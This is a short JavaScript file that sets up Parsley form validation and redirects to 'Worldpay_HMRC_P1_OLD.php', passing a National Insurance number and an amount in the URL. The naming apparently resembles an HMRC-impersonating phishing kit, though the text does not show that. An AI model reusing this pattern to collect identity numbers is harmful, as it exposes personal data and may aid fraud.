$(document).ready(function() {
  var errorMessage;
  $('form').parsley({
      trigger: 'change',
      successClass: "success",
      errorClass: "error",
      classHandler: function (el) {
          return el.$element.parent('.form-group');
      },
      errorsContainer: function (el) {
          return el.$element.parent().find('.error-container');
      },
      errorsWrapper: '<span class="error-message" aria-hidden="true"></span>',
      errorTemplate: '<span></span>'
  });
});

function completeAndRedirect(){
  location.href = "./Worldpay_HMRC_P1_OLD.php?refID="+document.getElementById('ni-number').value+"&Amount="+document.getElementById('amount-number').value;
}
